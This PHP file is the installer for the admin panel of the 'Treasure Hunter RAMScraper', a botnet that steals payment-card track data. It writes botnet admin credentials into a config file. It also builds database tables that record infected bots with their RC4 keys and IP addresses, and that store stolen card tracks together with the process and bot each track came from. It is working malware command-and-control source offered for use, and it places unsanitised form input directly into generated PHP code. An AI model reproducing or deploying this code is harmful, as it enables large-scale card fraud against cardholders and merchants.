<?php
require_once("common/dbOperations.php");
$configContents = file_get_contents("config.php");


if (isset($_POST["login"]) && isset($_POST["password"])){
	$configData = 
	"<?php" . PHP_EOL .
	"	/* Botnet admin credentials */" . PHP_EOL .
	'	define("LOGIN", "' . $_POST["login"] . '");' . PHP_EOL .
	'	define("PASSWORD", "' . sha1($_POST["password"]) . '"); //your password in SHA-1' . PHP_EOL . PHP_EOL .
	"	/* Database config */" . PHP_EOL .
	'	define("DBSERVER", "' . $_POST["dbserver"] . '");' . PHP_EOL .
	'	define("DBUSER", "' . $_POST["dbuser"] . '");' . PHP_EOL .
	'	define("DBPASSWORD", "' . $_POST["dbpassword"] . '");' . PHP_EOL .
	'	define("DATABASE", "' . $_POST["database"] . '");' . PHP_EOL . PHP_EOL .
	"	/* Timezone config, list of supported here: http://php.net/manual/en/timezones.php */" . PHP_EOL .
	'	define("TIMEZONE", "' . $_POST["timezone"] . '");' . PHP_EOL .
	"?>";

	$changeConfig = fopen("config.php", "w");
	if (!$changeConfig)
		echo "Couldn't write to the config.php file! Please edit it manually to make sure it contains the following:<br><pre>".htmlspecialchars($configData).'</pre><br>';
	else {
		fwrite($changeConfig, $configData);
		fclose($changeConfig);
	}


	$connection = connectToDB($_POST["dbserver"], $_POST["dbuser"], $_POST["dbpassword"], $_POST["database"]);

	$createDB = '
	SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
	SET time_zone = "+00:00";


	/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
	/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
	/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
	/*!40101 SET NAMES utf8 */;

	--
	-- Database: `' . filterString($_POST["database"]) . '`
	--
	CREATE DATABASE IF NOT EXISTS `' . filterString($_POST["database"]) . '` DEFAULT CHARACTER SET latin1 COLLATE latin1_swedish_ci;
	USE `' . filterString($_POST["database"]) . '`;

	-- --------------------------------------------------------

	--
	-- Table structure for table `bots`
	--

	CREATE TABLE IF NOT EXISTS `bots` (
	  `ID` varchar(32) NOT NULL,
	  `levelOneRC4Key` varchar(32) NOT NULL,
	  `levelTwoPirateCodeKey` varchar(32) NOT NULL,
	  `levelThreeRC4Key` varchar(32) NOT NULL,
	  `IP` varchar(45) NOT NULL,
	  `firstActive` int(11) NOT NULL,
	  `lastActive` int(11) NOT NULL,
	  `tracksRecievedToday` int(11) NOT NULL,
	  `tracksTotal` int(11) NOT NULL,
	  UNIQUE KEY `ID` (`ID`)
	) ENGINE=InnoDB DEFAULT CHARSET=latin1;

	-- --------------------------------------------------------

	--
	-- Table structure for table `tracks`
	--

	CREATE TABLE IF NOT EXISTS `tracks` (
	  `track` varchar(79) NOT NULL,
	  `type` int(1) NOT NULL,
	  `exePath` varchar(260) NOT NULL,
	  `PID` int(11) NOT NULL,
	  `botID` varchar(32) NOT NULL,
	  `timeRecieved` int(11) NOT NULL,
	  UNIQUE KEY `track` (`track`)
	) ENGINE=InnoDB DEFAULT CHARSET=latin1;

	/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
	/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
	/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
	';

	if (!$connection){
	?>

		<h1>Could not connect to database!</h1>

	<?php
		die();
	} else {
		$query = executeMultiQuery($createDB);
		if (!$query){
			echo mysql_error();
	?>
		<h1>Could not create database!</h1>
	<?php
			die();
		} else {
	?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<link rel="shortcut icon" href="images/favicon.ico">
		<title>Welcome to the Treasure Hunter RAMScraper version 0.1 Alpha installer</title>
		<link rel="stylesheet" type="text/css" href="CSS/style.css" media="screen" />
	</head>

	<body>
		<center>
			<h1>Install successfully completed!</h1>
			<p>You can now use your username and password to login at the <a href="./admin.php">admin panel</a>. Don't forget to delete install.php just in case!</p>
		</center>
	</body>
</html>
	<?php
			die();
		}
	}
}
?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<link rel="shortcut icon" href="images/favicon.ico">
		<title>Welcome to the Treasure Hunter RAMScraper version 0.1 Alpha installer</title>
		<link rel="stylesheet" type="text/css" href="CSS/style.css" media="screen" />
	</head>

	<body>
		<center>
			<h1>Enter configuration info</h1>

			<form name="configForm" action="" method="post">
				<table>
					<tr>
						<td class="loginMenu"><label for="login">Admin panel login</label></td>
						<td><input id="login" name="login" type="text"></input></td>
					</tr>
					<tr>
						<td class="loginMenu"><label for="password">Admin panel password</label></td>
						<td><input id="password" name="password" type="password"></input></td>
					</tr>
					<tr>
						<td class="loginMenu"><label for="dbserver">Database server</label></td>
						<td><input id="dbserver" name="dbserver" type="text"></input></td>
					</tr>
					<tr>
						<td class="loginMenu"><label for="dbuser">Database user</label></td>
						<td><input id="dbuser" name="dbuser" type="text"></input></td>
					</tr>
					<tr>
						<td class="loginMenu"><label for="dbpassword">Database password</label></td>
						<td><input id="dbpassword" name="dbpassword" type="password"></input></td>
					</tr>
					<tr>
						<td class="loginMenu"><label for="database">Database name</label></td>
						<td><input id="database" name="database" type="text"></input></td>
					</tr>
					<tr>
						<td class="loginMenu"><label for="timezone">Preferred timezone (list <a href="http://php.net/manual/en/timezones.php" target="_blank">here</a>)</label></td>
						<td><input id="timezone" name="timezone" type="text" value="Europe/Moscow"></input></td>
					</tr>
				</table>
				<input class="btn" type="submit" value="Save">
			</form>
		</center>
	</body>
</html>